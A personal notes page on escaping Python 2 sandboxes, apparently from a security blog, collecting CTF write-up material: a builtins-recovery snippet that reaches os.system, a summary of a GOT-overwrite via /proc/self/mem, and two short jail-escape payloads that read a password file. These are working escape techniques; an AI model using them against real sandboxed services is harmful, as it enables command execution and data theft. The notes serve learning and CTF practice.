<html><body><div><div class="inner-content"><p>
So as I've recently learnt Python "sandbox" (as in removing </p><u>_builtins_</u><p>, and similar tricks) doesn't work. And it seems this is sometimes useful since different projects tend to use a Python "sandbox" anyway. So I decided to put some links / notes here.</p><p>
(btw, this is about Python 2.6/2.7, not 3.X)
</p><p>
# Trick 1</p><p>
If __builtins__ are removed, and import doesn't work, you can use this:
</p><code><br/>
classes = {}.__class__.__base__.__subclasses__()<br/>
b = classes[<span class="my-color-3">49</span>]()._module.__builtins__<br/>
m = b['__import__']('os')<br/>
m.system("bla bla")<br/>
</code>
<p>
The </p><span class="my-color-3">49</span><p> there is </p><b>warnings.catch_warnings</b><p> in my case, however I recall on a different python version there was another warning-related class which has the same _module thing.</p><p>
This basically solves the problem of missing import.
</p><p>
# See also</p><p>
Basically any CTF writeup about python jail/sandbox escape.

</p><a href="http://blog.pnuts.tk/2013/04/plaidctf-pyjail-story-of-pythons-escape.html">http://blog.pnuts.tk/2013/04/plaidctf-pyjail-story-of-pythons-escape.html</a>
<a href="http://ctftime.org/task/377/">http://ctftime.org/task/377/</a>
<a href="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html</a>
<a href="http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/">http://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/</a>

<hr/><p>
The PlaidCTF 2014 had a </p><u>_nightmare_</u><p> task where you could execute any code, but there was nothing in the environment except stdout.</p><p>
It was solvable by accessing /proc/self/mem of the Python process and overwriting something. In our case we overwritten the fopen64 address in the .got/.plt with the address of system, and were able to run any command by just using type(stdout)("command").
</p><p>
Write-ups:
</p><a href="https://docs.google.com/document/d/1pgl19sRdNGH1mYNdjoZSRtkAFTn0TQYR7bhUDw99sew/edit#bookmark=id.hub6v8dj4caa">https://docs.google.com/document/d/1pgl19sRdNGH1mYNdjoZSRtkAFTn0TQYR7bhUDw99sew/edit#bookmark=id.hub6v8dj4caa</a><p> (by q3k and me)
</p><a href="http://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/">http://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/</a>


<hr/><p>
On the </p><a href="http://wargame.vn/">0x3004 CTF</a><p> recently there was a different kind of task, which looked like this:

</p><code><br/>
from sys import modules<br/>
modules.clear()<br/>
del modules<br/>
<br/>
__builtins__.dir = None<br/>
eval = None<br/>
input = None<br/>
execfile = None<br/>
<br/>
LEN_PASS = len(open('./password','r').read()) # Length of Password<br/>
                                <br/>
I_N_P_U_T = (  ) # only a-z0-9[]() and length of code must be &lt;= 50<br/>
                                <br/>
P_A_S_S_W_O_R_D = open('./password','r').read()<br/>
<br/>
assert LEN_PASS &gt;= 1<br/>
assert LEN_PASS == len(I_N_P_U_T)<br/>
for i in range(LEN_PASS):<br/>
  if I_N_P_U_T[i] != P_A_S_S_W_O_R_D[i]:<br/>
    from sys import exit<br/>
    exit() # Wrong<br/>
<br/>
# FLAGGGGGGGGGGGGGGGGGGGGGGGG<br/>
print 'Here is your flag:',open('./flag','r').read()<br/>
</code>
<p>
I played with the task quite a lot but in the end didn't manage to solve it. The organizers said there were two solutions, both really sweet:

</p><b>*Solution 1*</b><p>: max(open([list(vars())[5]for(password)in[0]][0]))</p><p>
It basically creates a new local variable called "password" (it's the newly defined iterator in the for loop), and then uses the name of this variable (that's the list(vars())[5] - the number here might vary; on the CTF server it was 8) as the name to open the ./password file. The max() there is used to read the data from the file; list(open(...))[0] would work as well, but max is shorter.</p><p>
Lesson: you actually could create new variables here

</p><b>*Solution 2*</b><p>: [chr(53)for(vars()[list(vars())[0]])in[1]]</p><p>
This one works by replacing the LEN_PASS variable with 1 (this is done by using the the LEN_PASS variable (hint: reference) - that's the vars()[list(vars())[0]] part - as a value-iterator for the [1] array; which basically means it sets it to 1) and then returning always a given character - in this case it was "5" (of course, you had to brute-force this character on the server).</p><p>
Lesson: list-for can be used to set existing variables, even if they are access in a really strange way
</p></div>
</div></body></html>